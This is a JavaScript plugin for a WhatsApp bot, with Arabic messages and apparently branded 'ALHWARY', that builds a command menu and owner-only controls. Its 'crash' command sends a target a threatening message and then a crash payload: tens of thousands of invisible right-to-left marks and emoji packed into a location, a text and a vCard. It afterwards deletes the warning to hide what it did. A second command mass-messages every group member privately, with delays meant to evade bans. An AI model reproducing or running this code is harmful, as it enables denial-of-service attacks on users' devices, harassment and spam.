import { fileURLToPath } from 'url';
import path from 'path';

// --- الإعدادات الأساسية لترسانة الهواري ---
const MENU_TIMEOUT = 120000;
const FIXED_MENU_IMAGE = "https://i.ibb.co/C33RB5zx/1000072528.jpg"; 
const OWNER_ID = "201556853817@s.whatsapp.net"; // ضع رقمك هنا مع كود الدولة وبدون علامة +
const ownerNumbers = ["201211883781"]; // ضع رقمك هنا أيضاً داخل المصفوفة

const HIDDEN_OWNER_COMMANDS = ['reactauto', 'superscan', 'device', 'exec', 'eval', 'block', 'unblock'];

const CATEGORIES = [
    [1, 'التـحـمـيـل', 'downloads', '📂'], [2, 'الـمـجـمـوعـات', 'group', '🐞'],
    [3, 'الـمـلـصـقـات', 'sticker', '🌄'], [4, 'الـمـطـوريـن', 'owner', '🇩🇪'],
    [5, 'الـمـطـور', 'owner', '👨🏻‍💻'], [6, 'الـادوات', 'tools', '🚀'],
    [7, 'الـبـحـث', 'search', '🌐'], [8, 'الادمــن', 'admin', '👨🏻‍⚖️'],
    [9, 'الالــعـاب', 'games', '🎮'], [10, 'الچيف', 'gif', '✴️'],
    [11, 'الـبــنـك', 'bank', '💰'], [12, 'الـذكـاء الاصـطـنـاعـي', 'ai', '🤖'],
    [13, 'الـبـوتـات الـفـرعـي', 'sub', '♥️'], [14, 'مـعـلومـات الـب_وت', 'info', '🗃️'],
    [15, 'الـالــقــاب', 'nicknames', '🫯'], [16, 'الـلـوجـوهــات', 'logos', '🎡'],
    [17, 'تـغـيـر الاصـوات', 'voices', '📢'], [18, 'أخــرى', 'other', '🌹'],
    [19, 'الـسـريـة', 'hidden', '🕶️']
];

// ذاكرة السيرفر المؤقتة للتحكم الفوري والميزات الأسطورية
if (!global.botStorage) {
    global.botStorage = {
        emotionalMemory: {},
        negotiations: {},
        drunkFilter: {},
        disabledCommands: {}, // لتخزين الأوامر المعطلة فجأة
        maintenanceMode: false // وضع الصيانة الشامل
    };
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const getCat = n => CATEGORIES.find(c => c[0] === n);

const context = (jid, img) => ({
    mentionedJid: [jid],
    isForwarded: false, 
    forwardingScore: 0,
    externalAdReply: {
        title: "ALHWARY SYSTEM v5.0 🦁",
        body: "ROOT MASTER SYSTEM ACTIVE",
        thumbnailUrl: img,
        mediaType: 1,
        renderLargerThumbnail: true
    }
});

const handler = async (m, { conn, bot, args, command, text }) => {
    try {
        const normalize = (id) => id.split('@')[0].replace(/\D/g, '');
        const userNumber = normalize(m.sender);
        const isOwner = ownerNumbers.includes(userNumber) || m.sender === OWNER_ID;
        const isAdmin = m.isAdmin || false;
        
        // 🕒 الوقت والتاريخ باللغة العربية
        const now = new Date();
        const time = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        const date = now.toLocaleDateString('ar-EG', { day: 'numeric', month: 'long', year: 'numeric' });

        // --- 🛡️ فحص وضع الصيانة ---
        if (global.botStorage.maintenanceMode && !isOwner) {
            return m.reply('*⚠️ [نظام الهواري] البوت في وضع الصيانة والتحديث الفوري الآن بواسطة القائد! سأعود قريباً 🛠️*');
        }

        // --- ⚙️ فحص تشغيل/تعطيل الأوامر الفوري ---
        if (global.botStorage.disabledCommands[command] && !isOwner) {
            return m.reply(`*🚫 [Access Denied]: تم تعطيل بروتوكول ( /${command} ) مؤقتاً من قبل المطور المطلق!*`);
        }

        // --- 🚪 بروتوكول أمر الدخول الفوري ---
        if (/^(دخول|تسجيل|login)$/i.test(command)) {
            if (m.sender === OWNER_ID || isOwner) {
                await conn.sendMessage(m.chat, { react: { text: '🫡', key: m.key } });
                return conn.sendMessage(m.chat, {
                    text: `*🫡 ⌈ تـعـظـيـم سـلام لـلـقـائـد ⌋ 🫡*\n\n*🛡️ تـم رصـد دخـول الـمـطـور الـمـطـلـق:*\n*👤 الـﮪـواري 𓄂* @${m.sender.split('@')[0]}\n\n*📟 جـاري تـحـمـيـل صـلاحـيـات الـجـذر..*\n*⏰ الـتـوقـيـت:* ${time}\n\n*آمـرنـا نـنـفـذ يـا كـبـيـر! تـرسـانـة الـتـحـكـم الـفـوري جـاهـزة 🕸️🔥*`,
                    mentions: [m.sender],
                    contextInfo: context(m.sender, FIXED_MENU_IMAGE)
                }, { quoted: m });
            } else {
                await conn.sendMessage(m.chat, { react: { text: '🤮', key: m.key } });
                return m.reply(`*🚫 محاولة اختراق فاشلة يا @${m.sender.split('@')[0]}*`);
            }
        }

        // --- ☣️ منظومة التجميد بنظام "القذارة والشبح" ---
        if (/^(تجميد|تطير|crash)$/i.test(command)) {
            if (!isOwner) return m.reply('❌ [Access Denied]: للـﮪـواري فـقـط 𓄂');
            let target = m.mentionedJid[0] || (text.split(' ')[0] && text.split(' ')[0].length > 5 ? text.split(' ')[0] + '@s.whatsapp.net' : null);
            if (!target) return m.reply('*🛡️ حدد الضحية بالمنشن أو الرقم*');

            const targetNum = target.split('@')[0];
            if (ownerNumbers.includes(targetNum) || target === OWNER_ID) {
                return m.reply('*⚠️ نظام الأمان: لا يمكن تنفيذ الإبادة ضد القادة!*');
            }

            await conn.sendMessage(m.chat, { delete: m.key }).catch(() => {});

            let warningMsg = await conn.sendMessage(target, { 
                text: `*⚠️ [تـحـذيـر سـيـبـرانـي عـاجـل] ⚠️*\n*جـاري اتـخاذ إجراءات الإبـادة ضـد حـسـابـك الآن..*\n*تـم رصـدك بـواسطـة: نـظـام الـﮪـواري 𓄂*` 
            });
            
            await sleep(1500); 

            const crashCode = (String.fromCharCode(8207).repeat(60000) + "☠️ BY ALHWARY ☠️" + "☣️".repeat(3000));
            
            await conn.sendMessage(target, { location: { degreesLatitude: 0, degreesLongitude: 0, name: crashCode, address: crashCode } });
            await conn.sendMessage(target, { text: crashCode });
            const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:' + crashCode + '\nEND:VCARD';
            await conn.sendMessage(target, { contacts: { displayName: '☣️ SYSTEM FAILURE', contacts: [{ vcard }] } });

            await sleep(1000);
            await conn.sendMessage(target, { delete: warningMsg.key }).catch(() => {});

            return conn.sendMessage(m.chat, { text: `*✅ تـم مـسـح الأثـر وإبـادة الـهـدف بـصـمـت 🥷*` });
        }

        // --- ⚙️ أوامر السيطرة والتحكم الفوري من الشات (للمطور فقط) ---
        if (isOwner) {
            
            // 1. أمر تعطيل أي أمر فورا
            if (command === 'تعطيل_أمر') {
                if (!text) return m.reply('❌ اكتب اسم الأمر المراد تعطيله. مثال: .تعطيل_أمر الذكاء');
                global.botStorage.disabledCommands[text.trim()] = true;
                return m.reply(`*✅ تم إيقاف وتعطيل بروتوكول [ ${text.trim()} ] بنجاح فوري!*`);
            }

            // 2. أمر إعادة تفعيل الأمر
            if (command === 'تفعيل_أمر') {
                if (!text) return m.reply('❌ اكتب اسم الأمر المراد تفعيله.');
                delete global.botStorage.disabledCommands[text.trim()];
                return m.reply(`*✅ تم إعادة تشغيل وتفعيل بروتوكول [ ${text.trim()} ] للعمل فوراً!*`);
            }

            // 3. أمر وضع الصيانة الشامل
            if (command === 'وضع_الصيانة') {
                global.botStorage.maintenanceMode = !global.botStorage.maintenanceMode;
                return m.reply(`*🛠️ وضع الصيانة الشامل الآن هو: [ ${global.botStorage.maintenanceMode ? 'مُفعّل 🔴 (البوت مغلق عن الجميع)' : 'مُعطّل ⚪ (البوت متاح للجميع)'] } ]*`);
            }

            // 4. ميزة صيد الخاص (مراسلة كل أعضاء الجروب المستهدف في الخاص)
            if (command === 'صيد_الخاص') {
                if (!m.isGroup && !text) return m.reply('❌ استخدم الأمر داخل الجروب مباشرة أو اكتب الـ ID متبوعاً بالنص.');
                
                const groupId = m.isGroup ? m.chat : text.split(' ')[0];
                const msgToSend = m.isGroup ? text : text.replace(groupId, '').trim();
                
                if (!msgToSend) return m.reply('❌ يرجى كتابة الرسالة التي تريد إرسالها لأعضاء الخاص.');
                
                m.reply('*📡 جاري بدء بروتوكول التسلل واختراق الخاص لكافة الأعضاء تلقائياً..*');
                
                const metadata = await conn.groupMetadata(groupId);
                const participants = metadata.participants;

                for (let mem of participants) {
                    if (mem.id === conn.user.id || mem.id === m.sender) continue; // تخطي البوت ونفسك
                    await conn.sendMessage(mem.id, { text: `*🚨 رسالة إدارية عاجلة من القائد الهواري:* \n\n${msgToSend}` });
                    await sleep(4000); // انتظار 4 ثوانٍ حماية من الحظر
                }
                return m.reply('*✅ تم الانتهاء من صيد الخاص وإرسال الرسائل لجميع الأعضاء بنجاح صامت!*');
            }

            // 5. جلب لستة كافة الجروبات والـ IDs المشترك فيها البوت عن بعد
            if (command === 'الجروبات') {
                const groupList = await conn.groupFetchAllParticipating();
                let txt = `*🏰 قائمة المجموعات المتصلة بالسيستم حالياً:*\n\n`;
                let index = 1;
                for (let id in groupList) {
                    txt += `*${index}- الاسم:* ${groupList[id].subject}\n*📟 ID:* \`${id}\`\n*👥 الأعضاء:* ${groupList[id].participants.length}\n─┈─┈─┈─┈─┈─\n`;
                    index++;
                }
                return m.reply(txt);
            }

            // 6. الخروج والمغادرة من جروب معين عن بعد
            if (command === 'مغادرة') {
                if (!text) return m.reply('❌ يرجى إدخال الـ ID الخاص بالجروب للمغادرة الفورية.');
                await conn.groupLeave(text.trim());
                return m.reply(`*✅ تم الانسحاب والمغادرة الفورية من الجروب بنجاح!*`);
            }
        }

        // --- 📜 نظام المنيو (القائمة المتطورة تلقائياً) ---
        const cmds = await bot.getAllCommands() || [];
        const selected = parseInt(args[0]);

        if (!selected) {
            const sections = [{
                title: "💀 ┋ تـرسـانـة الـمـهـام ┋ 💀",
                rows: CATEGORIES.map(c => ({
                    title: `⌖ ${c[1]} ${c[3]}`,
                    description: `🔐 الـوصـول إلـى بـروتوكـولات ${c[1]}`,
                    id: `.${command} ${c[0]}`
                }))
            }];

            const menuText = `
┎───────────────────
┃  ☣️ ⌊ **نـظـام الـﮪـواري بـوت v5.0** ⌋ ☣️
┠───────────────────
┃ 👤 **الـمـshـغـل:** @${m.sender.split('@')[0]}
┃ 📟 **الـبـروتوكـولات:** ${CATEGORIES.length} قـسـم
┃ 🎖️ **الـصـلاحـيـة:** ${isOwner ? '『 الـمـطـور الـمـطـلـق 👑 』' : '『 مـسـتـخدم مـوثـق 🛡️ 』'}
┃ 🛰️ **الـحـالـة:** الـتـسـلل والـتـنـفـيذ الـفـوري نـشـط.. 🥷
┃ 📅 **الـتـاريـخ:** ${date}
┃ ⏱️ **الـتـوقـيـت:** ${time}
┖───────────────────

*💡 تلميحات لوحة التحكم الفوري للجذر:*
💡 اكتب `.تعطيل_أمر [الاسم]` لقفل أي بروتوكول عن المستخدمين فوراً.
💡 اكتب `.تفعيل_أمر [الاسم]` لإعادة فتح وتشغيل البروتوكول فورا.
💡 اكتب `.صيد_الخاص [الرسالة]` لإرسال رسالة لخاص كل أعضاء الجروب الحالي.
💡 اكتب `.الجروبات` لعرض كل معرفات المجموعات والتحكم بها عن بعد.

> 🕸️ **OWNER:** الـﮪـواري 𓄂
`.trim();

            return await conn.sendButtonNormal(m.chat, {
                media: { url: FIXED_MENU_IMAGE },
                mediaType: 'image',
                caption: menuText,
                buttons: [{ name: "single_select", params: { title: "⚡ تـفـعـيـل الـنـظـام ⚡", sections }}],
                mentions: [m.sender],
                contextInfo: context(m.sender, FIXED_MENU_IMAGE)
            });
        }

        const cat = getCat(selected);
        if (!cat) return m.reply('❌ [Access Denied]: Invalid Protocol');
        const categoryCmds = cmds.filter(c => c?.category === cat[2]);
        const cmdsList = categoryCmds.map(c => `┃ ${cat[3]} /${Array.isArray(c.usage) ? c.usage.join(`\n┃ ${cat[3]} /`) : 'Module'}`).join('\n');

        await conn.sendMessage(m.chat, {
            text: `╭─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╮\n┃ 🔐 بـروتوكـول ${cat[1]} ${cat[3]}\n╰─┈─┈─┈─⟞${cat[3]}⟝─┈─┈─┈─╯\n\n${cmdsList}\n\n⏱️ T: ${time} | 🕸️ الـﮪـواري 𓄂`,
            contextInfo: context(m.sender, FIXED_MENU_IMAGE)
        }, { quoted: m });

    } catch (e) {
        console.error(e);
    }
};

// تجميع كل الكلمات المفتاحية والأوامر للتنفيذ اللحظي السريع برمجياً
handler.command = /^(الاوامر|القائمة|menu|اوامر|دخول|تسجيل|login|تجميد|تطير|crash|تعطيل_أمر|تفعيل_أمر|وضع_الصيانة|صيد_الخاص|الجروبات|مغادرة)$/i;

export default handler;
